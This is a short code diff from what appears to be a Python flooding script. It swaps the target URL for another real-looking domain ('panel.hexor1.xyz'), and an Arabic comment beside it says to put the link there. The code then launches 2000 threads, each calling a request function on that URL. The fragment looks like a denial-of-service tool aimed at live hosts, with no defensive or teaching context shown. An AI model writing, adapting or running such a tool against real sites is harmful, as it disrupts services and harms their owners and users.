@@ -38,7 +38,7 @@ def chek(url):
        # time.sleep(5)
 
 def start_threads():
-    target_url = "http://MO1.x10.mx/public"  # ضع الرابط هنا
+    target_url = "https://panel.hexor1.xyz/"  # ضع الرابط هنا
     for _ in range(2000):
         thread = threading.Thread(target=chek, args=(target_url,))
         thread.daemon = True
